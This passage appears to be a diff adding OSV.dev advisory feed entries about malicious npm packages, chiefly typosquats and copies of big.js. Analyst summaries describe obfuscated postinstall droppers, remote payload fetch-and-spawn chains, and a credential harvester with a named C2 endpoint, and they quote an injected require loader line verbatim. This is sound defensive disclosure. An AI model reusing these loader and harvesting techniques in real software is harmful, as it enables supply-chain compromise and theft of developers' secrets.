href="https://osv.dev/vulnerability/MAL-2026-6323"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6322: Malicious code in ts-predict-helper (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6322</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6322"/>
+    <published>2026-06-23T15:27:33Z</published>
+    <updated>2026-06-23T17:16:24Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-mjf5-46pf-x3j7"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in ts-predict-helper (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-mjf5-46pf-x3j7&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;ts-predict-helper&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (7efbafcedfb49da5093c3972473a549694dd9dd748281a299034c31578db1943)
+Package is published as `ts-predict-helper` but ships a byte-equivalent copy of big.js v7.0.1&amp;#x27;s source and README (which states &amp;#x27;No dependencies&amp;#x27;), along with spoofed `package.json` metadata pointing at MikeMcl/big.js and naming Michael Mclaughlin as author. Inside the otherwise-verbatim big.js source (around line 530) an injected try/catch block runs at module load: `try { const doc = require(&amp;quot;parket-flow&amp;quot;); doc.from_str().then(e =&amp;gt; { }).catch(e =&amp;gt; { }) } catch (error) { }`. The package declares an undisclosed runtime dependency on `parket-flow` ^3.0.1, which is unrelated to arbitrary-precision arithmetic and is the actual payload car…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ts-predict-helper/v/3.7.1"&gt;https://www.npmjs.com/package/ts-predict-helper/v/3.7.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ts-predict-helper/v/3.7.0"&gt;https://www.npmjs.com/package/ts-predict-helper/v/3.7.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-mjf5-46pf-x3j7"&gt;https://github.com/advisories/GHSA-mjf5-46pf-x3j7&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6322"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6315: Malicious code in ts-arithmetic-helper (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6315</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6315"/>
+    <published>2026-06-23T15:27:33Z</published>
+    <updated>2026-06-23T17:16:23Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-94cr-ccj8-78g6"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in ts-arithmetic-helper (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-94cr-ccj8-78g6&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;ts-arithmetic-helper&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (4712d3f1a81541e2b3143f89974200358301b0a9831c3187875adc1fbe82bfbe)
+ts-arithmetic-helper@3.7.2 ships source files that copy the big.js v7.0.1 library verbatim (preserving Michael Mclaughlin&amp;#x27;s copyright banner and the full big.js API) but inserts a hidden `require(&amp;#x27;parket-flow&amp;#x27;)` call between the `P.minus` and `P.mod` method definitions in both big.js and big.mjs. The require is wrapped in an empty try/catch and immediately invokes `doc.from_str()` with errors silently swallowed. Real big.js has zero runtime dependencies and never executes this code. `parket-flow` is declared as a runtime dependency in package.json (`&amp;quot;parket-flow&amp;quot;: &amp;quot;^3.0.2&amp;quot;`), so any installer that `require`s or `import`s this module pu…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ts-arithmetic-helper/v/3.7.2"&gt;https://www.npmjs.com/package/ts-arithmetic-helper/v/3.7.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-94cr-ccj8-78g6"&gt;https://github.com/advisories/GHSA-94cr-ccj8-78g6&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6315"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6336: Malicious code in sync-external (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6336</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6336"/>
+    <published>2026-06-23T15:38:44Z</published>
+    <updated>2026-06-23T17:16:23Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-vrc4-g2p2-9895"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in sync-external (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-vrc4-g2p2-9895&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;sync-external&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (9eba02cd977686ab88190a2b6adbf6cac674273f223ff2b2da59d6fe94fe3da6)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-vrc4-g2p2-9895"&gt;https://github.com/advisories/GHSA-vrc4-g2p2-9895&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6336"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6335: Malicious code in server-parket (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6335</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6335"/>
+    <published>2026-06-23T15:32:53Z</published>
+    <updated>2026-06-23T17:16:23Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-mvmx-6c22-q3fm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in server-parket (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-mvmx-6c22-q3fm&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;server-parket&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (9e771f79bc648994a4dc1e8bf9195230f1b6934984bcdb712269fe4c32a039ec)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-mvmx-6c22-q3fm"&gt;https://github.com/advisories/GHSA-mvmx-6c22-q3fm&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6335"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6333: Malicious code in mjs-eslint-service (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6333</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6333"/>
+    <published>2026-06-23T15:32:53Z</published>
+    <updated>2026-06-23T17:16:23Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-jwg8-mccp-c3vg"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in mjs-eslint-service (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-jwg8-mccp-c3vg&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;mjs-eslint-service&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (976e104551fb8019a7f905830a468229da9572b6ca5dc3b9e2b00e2140fe2c05)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-jwg8-mccp-c3vg"&gt;https://github.com/advisories/GHSA-jwg8-mccp-c3vg&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6333"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-6190: Malicious code in mjs-eslint-helper (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6190</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6190"/>
+    <published>2026-06-19T03:59:02Z</published>
+    <updated>2026-06-23T17:16:23Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-qhjh-jf49-fm8p"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in mjs-eslint-helper (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-qhjh-jf49-fm8p&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;mjs-eslint-helper&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (3320fa37492448acdf24a86f8a8735a3fc4d3b329ad156e299a8089df39e2f28)
+The package decodes base64 string literals via Buffer.from(..., &amp;#x27;base64&amp;#x27;).toString() and pipes the resulting content into execSync(&amp;#x27;bash...&amp;#x27;) and execSync(&amp;#x27;zsh...&amp;#x27;) invocations in index.js (lines 9, 101, 117, 194, 195). This is the canonical fingerprint of an install-time/import-time dropper: an obfuscated payload is decoded and executed through a shell interpreter, giving the publisher arbitrary code execution on any machine that installs or requires this package. The package name impersonates the eslint helper namespace, consistent with a typosquat lure delivering an active payload. No legitimate eslint helper requires shelling out t…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/mjs-eslint-helper/v/4.0.1"&gt;https://www.npmjs.com/package/mjs-eslint-helper/v/4.0.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-qhjh-jf49-fm8p"&gt;https://github.com/advisories/GHSA-qhjh-jf49-fm8p&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6190"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6332: Malicious code in cursorai-agent (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6332</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6332"/>
+    <published>2026-06-23T16:03:56Z</published>
+    <updated>2026-06-23T17:16:23Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-xq66-q5q9-992p"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in cursorai-agent (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-xq66-q5q9-992p&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;cursorai-agent&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (914d7c07827875b12edb7c67ca6ff6fdecf75072ece3ed1c8528d1036db6d96f)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-xq66-q5q9-992p"&gt;https://github.com/advisories/GHSA-xq66-q5q9-992p&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6332"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6310: Malicious code in @petitcode/eb-retry (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6310</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6310"/>
+    <published>2026-06-23T16:22:26Z</published>
+    <updated>2026-06-23T17:01:29Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @petitcode/eb-retry (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@petitcode/eb-retry&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (4386267addad1d2b89d4d471966e028ea201469edd6ece252f9710cd679c20aa)
+Package advertises itself as a small retry/exponential-backoff helper (lib/index.js is ~50 lines) but ships a 282KB obfuscator.io-packed lib/warmup.js (and matching lib/warmup.mjs at 250KB) whose runPrepare() is invoked unconditionally on every require(&amp;#x27;@petitcode/eb-retry&amp;#x27;). The same file is self-executing as a standalone script via `if (require.main === module) onInstall();` so it also runs during postinstall flows. The packed code contains AES-256-GCM decryption of an embedded encrypted blob (which carries a remote URL), an HTTPS fetch of additional payload bytes, and a child_process.spawn of process.execPath with the original argv …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@petitcode/eb-retry/v/1.3.4"&gt;https://www.npmjs.com/package/@petitcode/eb-retry/v/1.3.4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@petitcode/eb-retry/v/1.3.5"&gt;https://www.npmjs.com/package/@petitcode/eb-retry/v/1.3.5&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@petitcode/eb-retry/v/1.3.6"&gt;https://www.npmjs.com/package/@petitcode/eb-retry/v/1.3.6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@petitcode/eb-retry/v/1.3.3"&gt;https://www.npmjs.com/package/@petitcode/eb-retry/v/1.3.3&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6310"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-6211: Malicious code in @apiwizards/auth-middleware (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6211</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6211"/>
+    <published>2026-06-19T15:03:53Z</published>
+    <updated>2026-06-23T17:01:29Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @apiwizards/auth-middleware (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@apiwizards/auth-middleware&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (718ca10ce0670edf6756b4ff0bd05e43526ebd516396a34074acf844116e7254)
+@apiwizards/auth-middleware@5.1.2 ships a single heavily obfuscated index.js (obfuscator.io string-array with 317 entries, RC4+base64 decoder, array-rotation self-defending wrapper) that is the package&amp;#x27;s declared main. On require(), a top-level IIFE loads os/fs/child_process/crypto/path and an HTTP client, performs an HTTPS GET against a hardcoded URL constructed from a base concatenated with the package version, splits the response on &amp;#x27;:&amp;#x27; into key/iv/ciphertext, AES-decrypts the body via crypto.createDecipheriv, writes the cleartext to a file under os.tmpdir() with flag &amp;#x27;w+&amp;#x27;, and executes it via child_process (execSync with windowsHid…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@apiwizards/auth-middleware/v/4.7.0"&gt;https://www.npmjs.com/package/@apiwizards/auth-middleware/v/4.7.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@apiwizards/auth-middleware/v/5.1.2"&gt;https://www.npmjs.com/package/@apiwizards/auth-middleware/v/5.1.2&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6211"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6317: Malicious code in ts-bn-lint (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6317</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6317"/>
+    <published>2026-06-23T16:11:21Z</published>
+    <updated>2026-06-23T17:01:29Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in ts-bn-lint (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;ts-bn-lint&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (e591f0b407bc22e3abe20da9207df2d2922f75d98ab97aaa62557ca88b8fc349)
+ts-bn-lint@3.1.19 is a credential harvester disguised as a TypeScript/lint utility. index.js defines `decodeStr` which base64-decodes all operationally sensitive strings, including the C2 endpoint `https://data-stream.space/api/v1` (index.js:32) and the target filename patterns `.env`, `config.toml`, `Config.toml`, `config.json`, `id.json`, and `env` (index.js:13-18). The exported `from_str` function recursively walks `process.cwd()` collecting files matching those patterns, then gathers shell histories by invoking `execSync(&amp;quot;bash -c history&amp;quot;)` and `execSync(&amp;quot;zsh -c &amp;#x27;fc -l -1000&amp;#x27;&amp;quot;)` (index.js:101, 117), tagging each upload with the loc…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ts-bn-lint/v/5.8.0"&gt;https://www.npmjs.com/package/ts-bn-lint/v/5.8.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ts-bn-lint/v/3.1.19"&gt;https://www.npmjs.com/package/ts-bn-lint/v/3.1.19&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6317"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6320: Malicious code in ts-escrow (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6320</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6320"/>
+    <published>2026-06-23T16:11:23Z</published>
+    <updated>2026-06-23T17:01:29Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in ts-escrow (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;ts-escrow&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (9607025df61aa1728bceb1a71534460a9e9edf2f3cd1d4eedd533238786577c2)
+ts-escrow@0.1.0 is a verbatim copy of the big.js library (README, repository URL, author, version banner, and description all impersonate MikeMcl/big.js) republished under an unrelated name. Inserted between unrelated method definitions in big.js and big.mjs is a top-level, error-swallowing loader: `try { const doc = require(&amp;#x27;parket-slot&amp;#x27;); doc.from_str().then(e =&amp;gt; { }).catch(e =&amp;gt; { }) } catch (error) { }`. The &amp;#x27;parket-slot&amp;#x27; module is not declared in package.json. The manifest instead declares an unrelated dependency &amp;#x27;log-taker1&amp;#x27; (^0.1.0), also unrelated to big.js&amp;#x27;s documented zero-dependency posture. Any developer who installs ts-escr…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ts-escrow/v/0.1.0"&gt;https://www.npmjs.com/package/ts-escrow/v/0.1.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6320"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-6214: Malicious code in @chunklab/hexparse (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6214</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6214"/>
+    <published>2026-06-19T15:13:24Z</published>
+    <updated>2026-06-23T17:01:28Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @chunklab/hexparse (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@chunklab/hexparse&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (56ad779454aa221e4a3d5a13725428059b40edd7cd8a4329ef382348bc493013)
+Package advertises itself as a small hex/base64/endianness codec library, but every exported encode/decode function (encodeHex, decodeHex, encodeBase64,...) invokes `_runPrepare()` from `script/prelude.cjs` (and `esm/prelude.mjs`), a ~277 KB obfuscator.io-packed module using a rotating string array and RC4-style string decoder with hex-named identifiers (`_0xe119`, `_0x19b8`). The deobfuscated body pulls in `child_process` and `https`, downloads a remote payload, stages it under `os.tmpdir()` with sha256 verification, uses an `E13F_TAG` env-var re-entry guard and lockfiles, and finally spawns `process.execPath` on the downloaded file. …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@chunklab/hexparse/v/1.1.7"&gt;https://www.npmjs.com/package/@chunklab/hexparse/v/1.1.7&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@chunklab/hexparse/v/1.1.5"&gt;https://www.npmjs.com/package/@chunklab/hexparse/v/1.1.5&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@chunklab/hexparse/v/1.1.6"&gt;https://www.npmjs.com/package/@chunklab/hexparse/v/1.1.6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@chunklab/hexparse/v/1.0.7"&gt;https://www.npmjs.com/package/@chunklab/hexparse/v/1.0.7&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@chunklab/hexparse/v/1.1.4"&gt;https://www.npmjs.com/package/@chunklab/hexparse/v/1.1.4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6214"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6311: Malicious code in @thymelab/logfx (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6311</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6311"/>
+    <published>2026-06-23T16:22:33Z</published>
+    <updated>2026-06-23T17:01:28Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @thymelab/logfx (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@thymelab/logfx&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (edce595ab99f7bcc5404f8c1222a1d8f5a7cbbb1fc6cd6e02aabddaf19526839)
+@thymelab/logfx@2.15.5 ships a postinstall hook (`postinstall: node dist/bootstrap.js`) that runs a 282KB obfuscator.io-packed script on every `npm install`. The decoded control flow performs HTTPS GETs to a runtime-decrypted URL, AES-256-GCM-decrypts the response using an embedded key, sha256-verifies, stages files into `os.tmpdir()`, chmod&amp;#x27;s them, and re-spawns them via `process.execPath` using `child_process.spawn` with detached/unref&amp;#x27;d handles. The script disables itself when `--inspect`/`--debug` are present (anti-analysis). The destination URL and decryption key are not pinned plaintext — they are decrypted at runtime, giving the…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@thymelab/logfx/v/2.15.3"&gt;https://www.npmjs.com/package/@thymelab/logfx/v/2.15.3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@thymelab/logfx/v/2.15.6"&gt;https://www.npmjs.com/package/@thymelab/logfx/v/2.15.6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@thymelab/logfx/v/2.15.5"&gt;https://www.npmjs.com/package/@thymelab/logfx/v/2.15.5&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@thymelab/logfx/v/2.15.4"&gt;https://www.npmjs.com/package/@thymelab/logfx/v/2.15.4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6311"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6307: Malicious code in @glitchpad/throttler (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6307</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6307"/>
+    <published>2026-06-23T16:23:03Z</published>
+    <updated>2026-06-23T17:01:28Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @glitchpad/throttler (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@glitchpad/throttler&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (60ffa9bdf180aec157894e395106c8dd7f18fa1f83ff9828d94a9070dbf8cc2e)
+package.json declares `postinstall: node./primer.cjs`. primer.cjs is a 262 KB heavily obfuscated loader (RC4-decoded string array of 1176 entries, control-flow flattening, self-defending anti-debugger regex trap on Function.prototype.toString) that AES-256-GCM-decrypts a hardcoded URL at runtime, performs an HTTPS request with redirect following, writes the response bytes to a temp file, and then spawns a detached Node process against that file (`spawn(process.execPath, [tmp], {detached:true, stdio:&amp;#x27;ignore&amp;#x27;})`). The fetched bytes are opaque and the destination is only revealed after runtime decryption. The same dropper is also reachabl…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@glitchpad/throttler/v/2.2.4"&gt;https://www.npmjs.com/package/@glitchpad/throttler/v/2.2.4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@glitchpad/throttler/v/2.2.3"&gt;https://www.npmjs.com/package/@glitchpad/throttler/v/2.2.3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@glitchpad/throttler/v/2.2.2"&gt;https://www.npmjs.com/package/@glitchpad/throttler/v/2.2.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@glitchpad/throttler/v/2.2.1"&gt;https://www.npmjs.com/package/@glitchpad/throttler/v/2.2.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a 